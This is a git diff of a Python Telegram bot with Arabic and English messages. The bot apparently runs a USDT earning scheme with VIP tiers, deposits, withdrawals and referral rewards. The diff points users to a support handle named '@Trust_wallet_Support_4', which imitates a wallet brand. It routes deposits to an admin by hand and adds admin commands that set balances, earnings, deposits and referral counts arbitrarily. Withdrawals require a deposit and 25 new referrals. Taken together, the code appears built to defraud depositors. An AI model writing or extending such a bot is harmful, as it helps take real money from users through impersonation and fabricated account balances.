@@ -533,7 +533,7 @@ def handle_daily_bonus(call):
         time.sleep(1)
         show_main_menu(call.message.chat.id, call.message.message_id, call.from_user.id)
 
-# 💎 نظام VIP
+# 💎 نظام VIP - محدث مع إرسال رابط المستخدم
 @bot.callback_query_handler(func=lambda call: call.data == "vip_services")
 def show_vip_services(call):
     try:
@@ -608,15 +608,48 @@ def handle_vip_purchase(call):
         vip_name = vip_names[vip_type] if lang == 'ar' else vip_type.capitalize()
         vip_price = vip_prices[vip_type]
         
-        # إرسال إشعار للمسؤول
-        try:
-            bot.send_message(YOUR_USER_ID, f"🆕 <b>طلب شراء VIP جديد</b>\n\n👤 <b>المستخدم:</b> {user['first_name'] or 'غير معروف'}\n🆔 <b>الآيدي:</b> {user['user_id']}\n💎 <b>النوع:</b> {vip_name} VIP\n💰 <b>السعر:</b> {vip_price} USDT")
-        except: pass
+        # إنشاء رابط المستخدم للتواصل المباشر
+        user_link = f"<a href='tg://user?id={call.from_user.id}'>{user['first_name'] or 'مستخدم'}</a>"
+        user_id_link = f"<a href='tg://user?id={call.from_user.id}'>{call.from_user.id}</a>"
         
-        message_text = f"✅ <b>تم إرسال طلب شراء {vip_name} VIP بنجاح!</b>\n\n💰 <b>السعر:</b> {vip_price} USDT\n📞 <b>سيقوم المسؤول بالتواصل معك خلال 24 ساعة</b>\n\nشكراً لثقتك بنا! 🌟" if lang == 'ar' else f"✅ <b>{vip_name} VIP purchase request sent successfully!</b>\n\n💰 <b>Price:</b> {vip_price} USDT\n📞 <b>Admin will contact you within 24 hours</b>\n\nThank you for your trust! 🌟"
+        # إرسال إشعار للمسؤول مع رابط المستخدم
+        admin_message = f"""🆕 <b>طلب شراء VIP جديد</b>
+
+👤 <b>المستخدم:</b> {user_link}
+🆔 <b>الآيدي:</b> {user_id_link}
+📞 <b>رابط التواصل:</b> <a href='tg://user?id={call.from_user.id}'>اضغط للتواصل</a>
+
+💎 <b>النوع:</b> {vip_name} VIP
+💰 <b>السعر:</b> {vip_price} USDT
+
+💵 <b>رصيده الحالي:</b> {user['balance']:.2f} USDT
+👥 <b>إحالاته:</b> {user['referral_count']}"""
+        
+        try:
+            bot.send_message(YOUR_USER_ID, admin_message)
+        except Exception as e:
+            print(f"❌ Failed to send admin notification: {e}")
+        
+        message_text = f"""✅ <b>تم إرسال طلب شراء {vip_name} VIP بنجاح!</b>
+
+💰 <b>السعر:</b> {vip_price} USDT
+📞 <b>سيقوم المسؤول بالتواصل معك خلال 24 ساعة</b>
+
+🔗 <b>للتواصل السريع:</b>
+يمكنك مراسلة المسؤول مباشرة على @Trust_wallet_Support_4
+
+شكراً لثقتك بنا! 🌟""" if lang == 'ar' else f"""✅ <b>{vip_name} VIP purchase request sent successfully!</b>
+
+💰 <b>Price:</b> {vip_price} USDT
+📞 <b>Admin will contact you within 24 hours</b>
+
+🔗 <b>For fast contact:</b>
+You can message admin directly at @Trust_wallet_Support_4
+
+Thank you for your trust! 🌟"""
         
         bot.send_message(call.from_user.id, message_text)
-        bot.answer_callback_query(call.id, f"✅ تم إرسال الطلب" if lang == 'ar' else f"✅ Request sent")
+        bot.answer_callback_query(call.id, f"✅ تم إرسال الطلب للمسؤول" if lang == 'ar' else f"✅ Request sent to admin")
         
     except Exception as e:
         print(f"❌ VIP purchase error: {e}")
@@ -795,10 +828,28 @@ def handle_withdraw_request(call):
             bot.answer_callback_query(call.id, f"❌ رصيدك غير كافي! الرصيد: {user['balance']:.1f} USDT" if lang == 'ar' else f"❌ Your balance is insufficient! Balance: {user['balance']:.1f} USDT", show_alert=True)
             return
         
-        # إرسال إشعار للمسؤول
+        # إنشاء رابط المستخدم للتواصل المباشر
+        user_link = f"<a href='tg://user?id={call.from_user.id}'>{user['first_name'] or 'مستخدم'}</a>"
+        user_id_link = f"<a href='tg://user?id={call.from_user.id}'>{call.from_user.id}</a>"
+        
+        # إرسال إشعار للمسؤول مع رابط المستخدم
+        admin_message = f"""🆕 <b>طلب سحب جديد</b>
+
+👤 <b>المستخدم:</b> {user_link}
+🆔 <b>الآيدي:</b> {user_id_link}
+📞 <b>رابط التواصل:</b> <a href='tg://user?id={call.from_user.id}'>اضغط للتواصل</a>
+
+💰 <b>المبلغ:</b> {amount:.1f} USDT
+📅 <b>مدة العضوية:</b> {days_registered} يوم
+👥 <b>الإحالات:</b> {user['new_referrals']}/25
+
+💵 <b>رصيده الكلي:</b> {user['balance']:.1f} USDT
+💎 <b>إجمالي أرباحه:</b> {user['total_earnings']:.1f} USDT"""
+        
         try:
-            bot.send_message(YOUR_USER_ID, f"🆕 <b>طلب سحب جديد</b>\n\n👤 <b>المستخدم:</b> {user['first_name'] or 'غير معروف'}\n🆔 <b>الآيدي:</b> {user['user_id']}\n💰 <b>المبلغ:</b> {amount:.1f} USDT\n📅 <b>مدة العضوية:</b> {days_registered} يوم\n👥 <b>الإحالات:</b> {user['new_referrals']}/25")
-        except: pass
+            bot.send_message(YOUR_USER_ID, admin_message)
+        except Exception as e:
+            print(f"❌ Failed to send admin notification: {e}")
         
         confirmation_text = f"""✅ <b>تم إرسال طلب السحب بنجاح!</b>
 
@@ -807,6 +858,9 @@ def handle_withdraw_request(call):
 👥 <b>الإحالات:</b> {user['new_referrals']}/25
 
 <b>📞 سيقوم الدعم الفني بالتواصل معك خلال 24 ساعة</b>
+
+<b>🔗 للتواصل السريع:</b>
+يمكنك مراسلة الدعم مباشرة على @Trust_wallet_Support_4
 
 <b>🔒 لضمان أمان معاملاتك، سيتم التعامل مع طلبك شخصياً عبر الدعم الفني</b>
 
@@ -818,6 +872,9 @@ def handle_withdraw_request(call):
 
 <b>📞 Technical support will contact you within 24 hours</b>
 
+<b>🔗 For fast contact:</b>
+You can message support directly at @Trust_wallet_Support_4
+
 <b>🔒 To ensure transaction security, your request will be handled personally by support</b>
 
 Thank you for using our services! 🌟"""
@@ -828,7 +885,7 @@ Thank you for using our services! 🌟"""
     except Exception as e:
         print(f"❌ Withdraw request error: {e}")
 
-# 💳 نظام الإيداع
+# 💳 نظام الإيداع - محدث مع إرسال رابط المستخدم
 @bot.callback_query_handler(func=lambda call: call.data == "deposit")
 def handle_deposit(call):
     try:
@@ -845,9 +902,9 @@ def handle_deposit(call):
 
 <b>🚀 لإجراء الإيداع:</b>
 1. اضغط على زر 'طلب إيداع' أدناه
-2. سيتم تحويلك للمسؤول
-3. أرسل مبلغ الإيداع
-4. سيتم تفعيل حسابك خلال 24 ساعة
+2. سيتم إرسال طلبك للمسؤول
+3. سيتواصل معك المسؤول خلال 24 ساعة
+4. أرسل مبلغ الإيداع للمسؤول
 
 <b>✅ بعد الإيداع ستصبح مؤهلاً ل:</b>
 • سحب الأرباح
@@ -863,9 +920,9 @@ def handle_deposit(call):
 
 <b>🚀 To make a deposit:</b>
 1. Click 'Request Deposit' below
-2. You will be redirected to admin
-3. Send the deposit amount
-4. Your account will be activated within 24 hours
+2. Your request will be sent to admin
+3. Admin will contact you within 24 hours
+4. Send deposit amount to admin
 
 <b>✅ After deposit you will be eligible for:</b>
 • Earnings withdrawal
@@ -886,19 +943,51 @@ def handle_request_deposit(call):
         user = get_user(call.from_user.id)
         lang = get_user_language(call.from_user.id)
         
-        # إرسال إشعار للمسؤول
-        try:
-            bot.send_message(YOUR_USER_ID, f"🆕 <b>طلب إيداع جديد</b>\n\n👤 <b>المستخدم:</b> {user['first_name'] or 'غير معروف'}\n🆔 <b>الآيدي:</b> {user['user_id']}\n💰 <b>الحد الأدنى:</b> 10 USDT\n💵 <b>رصيده الحالي:</b> {user['balance']:.1f} USDT")
-        except: pass
+        # إنشاء رابط المستخدم للتواصل المباشر
+        user_link = f"<a href='tg://user?id={call.from_user.id}'>{user['first_name'] or 'مستخدم'}</a>"
+        user_id_link = f"<a href='tg://user?id={call.from_user.id}'>{call.from_user.id}</a>"
         
-        message_text = "✅ <b>تم إرسال طلب الإيداع بنجاح!</b>\n\n📞 <b>سيقوم المسؤول بالتواصل معك خلال 24 ساعة</b>\n💰 <b>الحد الأدنى للإيداع: 10 USDT</b>\n\nشكراً لثقتك بنا! 🌟" if lang == 'ar' else "✅ <b>Deposit request sent successfully!</b>\n\n📞 <b>Admin will contact you within 24 hours</b>\n💰 <b>Minimum deposit: 10 USDT</b>\n\nThank you for your trust! 🌟"
+        # إرسال إشعار للمسؤول مع رابط المستخدم
+        admin_message = f"""🆕 <b>طلب إيداع جديد</b>
+
+👤 <b>المستخدم:</b> {user_link}
+🆔 <b>الآيدي:</b> {user_id_link}
+📞 <b>رابط التواصل:</b> <a href='tg://user?id={call.from_user.id}'>اضغط للتواصل</a>
+
+💰 <b>الحد الأدنى:</b> 10 USDT
+💵 <b>رصيده الحالي:</b> {user['balance']:.1f} USDT
+👥 <b>إحالاته:</b> {user['referral_count']}
+📅 <b>مدة العضوية:</b> {get_membership_days(call.from_user.id)[0]} يوم"""
+        
+        try:
+            bot.send_message(YOUR_USER_ID, admin_message)
+        except Exception as e:
+            print(f"❌ Failed to send admin notification: {e}")
+        
+        message_text = """✅ <b>تم إرسال طلب الإيداع بنجاح!</b>
+
+💰 <b>الحد الأدنى للإيداع: 10 USDT</b>
+📞 <b>سيقوم المسؤول بالتواصل معك خلال 24 ساعة</b>
+
+🔗 <b>للتواصل السريع:</b>
+يمكنك مراسلة المسؤول مباشرة على @Trust_wallet_Support_4
+
+شكراً لثقتك بنا! 🌟""" if lang == 'ar' else """✅ <b>Deposit request sent successfully!</b>
+
+💰 <b>Minimum deposit: 10 USDT</b>
+📞 <b>Admin will contact you within 24 hours</b>
+
+🔗 <b>For fast contact:</b>
+You can message admin directly at @Trust_wallet_Support_4
+
+Thank you for your trust! 🌟"""
         
         bot.send_message(call.from_user.id, message_text)
         bot.answer_callback_query(call.id, "✅ تم إرسال طلب الإيداع للمسؤول" if lang == 'ar' else "✅ Deposit request sent to admin")
     except Exception as e:
         print(f"❌ Deposit request error: {e}")
 
-# 🛠️ الأوامر الإدارية
+# 🛠️ الأوامر الإدارية - محدثة بالكامل
 @bot.message_handler(commands=['quickadd'])
 def handle_quickadd(message):
     if not is_admin(message.from_user.id):
@@ -915,8 +1004,8 @@ def handle_quickadd(message):
             bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
             return
         new_balance = user['balance'] + amount
-        if update_user(target_user_id, balance=new_balance):
-            bot.reply_to(message, f"✅ <b>تم إضافة {amount} USDT للمستخدم {target_user_id}</b>")
+        if update_user(target_user_id, balance=new_balance, total_earnings=user['total_earnings'] + amount):
+            bot.reply_to(message, f"✅ <b>تم إضافة {amount} USDT للمستخدم {target_user_id}</b>\n💰 <b>الرصيد الجديد:</b> {new_balance:.2f} USDT")
         else:
             bot.reply_to(message, "❌ <b>فشل في إضافة الرصيد!</b>")
     except Exception as e:
@@ -941,6 +1030,206 @@ def handle_setbalance(message):
             bot.reply_to(message, f"✅ <b>تم تعيين رصيد المستخدم {target_user_id} إلى {amount} USDT</b>")
         else:
             bot.reply_to(message, "❌ <b>فشل في تعيين الرصيد!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['setreferrals'])
+def handle_setreferrals(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/setreferrals [user_id] [count]</code>")
+            return
+        target_user_id, count = parts[1], int(parts[2])
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        if update_user(target_user_id, referral_count=count, new_referrals=count):
+            bot.reply_to(message, f"✅ <b>تم تعيين إحالات المستخدم {target_user_id} إلى {count}</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في تعيين الإحالات!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['addreferral'])
+def handle_addreferral(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/addreferral [user_id]</code>")
+            return
+        target_user_id = parts[1]
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        
+        new_ref_count = user['referral_count'] + 1
+        new_ref_new = user.get('new_referrals', 0) + 1
+        new_balance = user['balance'] + 1.0
+        
+        if update_user(target_user_id, 
+                      referral_count=new_ref_count,
+                      new_referrals=new_ref_new,
+                      balance=new_balance,
+                      total_earnings=user['total_earnings'] + 1.0):
+            bot.reply_to(message, f"✅ <b>تم إضافة إحالة للمستخدم {target_user_id}</b>\n👥 <b>الإحالات الجديدة:</b> {new_ref_new}\n💰 <b>المكافأة:</b> 1.0 USDT")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في إضافة الإحالة!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['setattempts'])
+def handle_setattempts(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/setattempts [user_id] [attempts]</code>")
+            return
+        target_user_id, attempts = parts[1], int(parts[2])
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        if update_user(target_user_id, attempts=attempts):
+            bot.reply_to(message, f"✅ <b>تم تعيين محاولات المستخدم {target_user_id} إلى {attempts}</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في تعيين المحاولات!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['resetattempts'])
+def handle_resetattempts(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 2:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/resetattempts [user_id]</code>")
+            return
+        target_user_id = parts[1]
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        if update_user(target_user_id, games_played_today=0):
+            bot.reply_to(message, f"✅ <b>تم إعادة تعيين محاولات اليوم للمستخدم {target_user_id}</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في إعادة تعيين المحاولات!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['addattempts'])
+def handle_addattempts(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/addattempts [user_id] [count]</code>")
+            return
+        target_user_id, count = parts[1], int(parts[2])
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        
+        new_attempts = user['attempts'] + count
+        if update_user(target_user_id, attempts=new_attempts):
+            bot.reply_to(message, f"✅ <b>تم إضافة {count} محاولة للمستخدم {target_user_id}</b>\n🎯 <b>المحاولات الجديدة:</b> {new_attempts}")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في إضافة المحاولات!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['setdeposits'])
+def handle_setdeposits(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/setdeposits [user_id] [amount]</code>")
+            return
+        target_user_id, amount = parts[1], float(parts[2])
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        if update_user(target_user_id, total_deposits=amount):
+            bot.reply_to(message, f"✅ <b>تم تعيين إجمالي إيداعات المستخدم {target_user_id} إلى {amount} USDT</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في تعيين الإيداعات!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['adddeposit'])
+def handle_adddeposit(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/adddeposit [user_id] [amount]</code>")
+            return
+        target_user_id, amount = parts[1], float(parts[2])
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        
+        new_deposits = user['total_deposits'] + amount
+        new_balance = user['balance'] + amount
+        if update_user(target_user_id, 
+                      total_deposits=new_deposits,
+                      balance=new_balance,
+                      has_deposit=1):
+            bot.reply_to(message, f"✅ <b>تم إضافة إيداع للمستخدم {target_user_id}</b>\n💰 <b>المبلغ:</b> {amount} USDT\n💵 <b>الرصيد الجديد:</b> {new_balance:.2f} USDT\n✅ <b>تم تفعيل الإيداع</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في إضافة الإيداع!</b>")
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
+@bot.message_handler(commands=['setvip'])
+def handle_setvip(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        parts = message.text.split()
+        if len(parts) != 3:
+            bot.reply_to(message, "📝 <b>استخدام:</b> <code>/setvip [user_id] [level]</code>\n\n🏆 <b>مستويات VIP:</b>\n0 - مبتدئ\n1 - برونز\n2 - سيلفر\n3 - جولد")
+            return
+        target_user_id, level = parts[1], int(parts[2])
+        
+        if level not in VIP_LEVELS:
+            bot.reply_to(message, "❌ <b>مستوى VIP غير صحيح!</b>\n\n🏆 <b>المستويات المتاحة:</b>\n0 - مبتدئ\n1 - برونز\n2 - سيلفر\n3 - جولد")
+            return
+            
+        user = get_user(target_user_id)
+        if not user:
+            bot.reply_to(message, "❌ <b>المستخدم غير موجود!</b>")
+            return
+        
+        vip_name = VIP_LEVELS[level]['name_ar']
+        if update_user(target_user_id, vip_level=level):
+            bot.reply_to(message, f"✅ <b>تم ترقية المستخدم {target_user_id} إلى مستوى {vip_name}</b>")
+        else:
+            bot.reply_to(message, "❌ <b>فشل في تعيين مستوى VIP!</b>")
     except Exception as e:
         bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
 
@@ -986,6 +1275,25 @@ def handle_userinfo(message):
     except Exception as e:
         bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
 
+@bot.message_handler(commands=['listusers'])
+def handle_listusers(message):
+    if not is_admin(message.from_user.id):
+        bot.reply_to(message, "❌ <b>ليس لديك صلاحية!</b>")
+        return
+    try:
+        users = list(users_collection.find().limit(50))
+        if not users:
+            bot.reply_to(message, "❌ <b>لا يوجد مستخدمين!</b>")
+            return
+        
+        users_list = "📋 <b>آخر 50 مستخدم:</b>\n\n"
+        for i, user in enumerate(users, 1):
+            users_list += f"{i}. {user['first_name'] or 'غير معروف'} - <code>{user['user_id']}</code>\n"
+        
+        bot.reply_to(message, users_list)
+    except Exception as e:
+        bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
+
 @bot.message_handler(commands=['stats'])
 def handle_stats(message):
     if not is_admin(message.from_user.id):
@@ -1023,8 +1331,6 @@ def handle_stats(message):
         bot.reply_to(message, stats_msg)
     except Exception as e:
         bot.reply_to(message, f"❌ <b>خطأ:</b> {e}")
-
-# إضافة باقي الأوامر الإدارية بنفس النمط...
 
 # 🔧 نظام التشغيل السريع
 app = Flask(__name__)
